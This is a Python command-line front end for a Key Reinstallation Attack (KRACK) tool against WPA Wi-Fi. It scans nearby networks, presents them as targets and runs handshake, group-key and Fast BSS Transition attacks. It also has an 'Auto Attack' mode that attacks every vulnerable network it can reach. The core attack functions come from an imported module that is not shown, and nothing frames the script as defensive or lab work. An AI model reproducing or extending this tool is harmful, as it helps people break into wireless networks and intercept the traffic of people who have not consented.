#!/usr/bin/env python3

import click
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
import krack_attack as ka
import sys
import time

console = Console()

def print_banner():
    console.print("""[bold blue]
╔═╗ ╦═╗ ╔═╗ ╔═╗ ╦╔═  ╔═╗ ╔╦╗ ╔╦╗ ╔═╗ ╔═╗ ╦╔═ 
╠═╝ ╠╦╝ ╠═╣ ║   ╠╩╗  ╠═╣  ║   ║  ╠═╣ ║   ╠╩╗
╩   ╩╚═ ╩ ╩ ╚═╝ ╩ ╩  ╩ ╩  ╩   ╩  ╩ ╩ ╚═╝ ╩ ╩
[/bold blue]
[bold yellow]Key Reinstallation Attack Tool[/bold yellow]
""")

def validate_mac(ctx, param, value):
    """Validate MAC address format."""
    if value is None:
        return None
    
    parts = value.split(':')
    if len(parts) != 6 or not all(len(p) == 2 and p.isalnum() for p in parts):
        raise click.BadParameter('Invalid MAC address format. Use XX:XX:XX:XX:XX:XX')
    return value

def scan_for_targets(interface):
    """Scan for available Wi-Fi networks and return targets."""
    console.print("[yellow]Scanning for targets...[/yellow]")
    networks = ka.scan_networks(interface)
    
    if not networks:
        console.print("[red]No networks found.[/red]")
        return None
    
    table = Table(title="Available Targets")
    table.add_column("ID", justify="right", style="cyan")
    table.add_column("ESSID", style="magenta")
    table.add_column("BSSID", style="green")
    table.add_column("Channel", justify="right")
    table.add_column("Signal", style="yellow")
    
    for i, network in enumerate(networks, 1):
        table.add_row(
            str(i),
            network['ESSID'],
            network['Address'],
            network['Channel'],
            network.get('Signal', 'N/A')
        )
    
    console.print(table)
    return networks

def select_attack_type():
    """Let user select which attack type to perform."""
    table = Table(title="Available Attack Types")
    table.add_column("ID", justify="right", style="cyan")
    table.add_column("Attack Type", style="magenta")
    table.add_column("Description")
    
    attacks = [
        ("1", "4-Way Handshake (Plaintext)", "Attack using plaintext retransmission"),
        ("2", "4-Way Handshake (Encrypted)", "Attack using encrypted retransmission"),
        ("3", "Group Key (Immediate)", "Group key attack with immediate installation"),
        ("4", "Group Key (Delayed)", "Group key attack with delayed installation"),
        ("5", "Fast BSS Transition", "Attack the Fast BSS Transition handshake"),
        ("6", "Auto Attack", "Automatically attack all vulnerable networks")
    ]
    
    for id, name, desc in attacks:
        table.add_row(id, name, desc)
    
    console.print(table)
    choice = Prompt.ask(
        "Select attack type",
        choices=["1", "2", "3", "4", "5", "6"],
        default="1"
    )
    return int(choice)

@click.command()
@click.option('--interface', '-i', help='Network interface to use')
@click.option('--ap-mac', callback=validate_mac, help='Target AP MAC address')
@click.option('--client-mac', callback=validate_mac, help='Target client MAC address')
@click.option('--scan/--no-scan', default=True, help='Scan for targets before attack')
@click.option('--min-signal', default=-70, help='Minimum signal strength for auto attack mode (dBm)')
@click.option('--attack-timeout', default=300, help='Timeout for each attack attempt in auto mode (seconds)')
@click.option('--scan-interval', default=60, help='Interval between network scans in auto mode (seconds)')
def main(interface, ap_mac, client_mac, scan, min_signal, attack_timeout, scan_interval):
    """KRACK (Key Reinstallation Attack) Tool"""
    print_banner()
    
    # Select interface if not provided
    if not interface:
        interface = ka.select_interface_enhanced()
        if not interface:
            sys.exit(1)
    
    # Scan for targets if requested
    if scan and not (ap_mac and client_mac):
        networks = scan_for_targets(interface)
        if networks:
            choice = Prompt.ask(
                "Select target network",
                choices=[str(i) for i in range(1, len(networks) + 1)],
                default="1"
            )
            network = networks[int(choice) - 1]
            ap_mac = network['Address']
            
            # Wait for client
            console.print("[yellow]Waiting for client connection...[/yellow]")
            time.sleep(5)  # Give time for potential clients to connect
            
            # TODO: Implement client detection
            if not client_mac:
                client_mac = Prompt.ask("Enter client MAC address")
    
    # Select attack type
    attack_type = select_attack_type()
    
    # Execute selected attack
    try:
        if attack_type == 6:  # Auto Attack
            ka.auto_attack(
                interface,
                min_signal=min_signal,
                attack_timeout=attack_timeout,
                scan_interval=scan_interval
            )
        else:
            # Ensure we have target addresses for non-auto attacks
            if not ap_mac or (not client_mac and attack_type not in [3, 4]):
                console.print("[red]Error: Both AP and client MAC addresses are required for this attack type.[/red]")
                sys.exit(1)
            
            if attack_type == 1:
                ka.four_way_handshake_plaintext_retransmission(interface, ap_mac, client_mac)
            elif attack_type == 2:
                ka.four_way_handshake_encrypted_retransmission(interface, ap_mac, client_mac)
            elif attack_type == 3:
                ka.group_key_handshake_immediate_install(interface, ap_mac)
            elif attack_type == 4:
                ka.group_key_handshake_delayed_install(interface, ap_mac)
            elif attack_type == 5:
                ka.fast_bss_transition_attack(interface, ap_mac, client_mac)
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user.[/yellow]")
    except Exception as e:
        console.print(f"[red]Error during attack: {e}[/red]")
    finally:
        console.print("[green]Attack completed.[/green]")

if __name__ == '__main__':
    main() 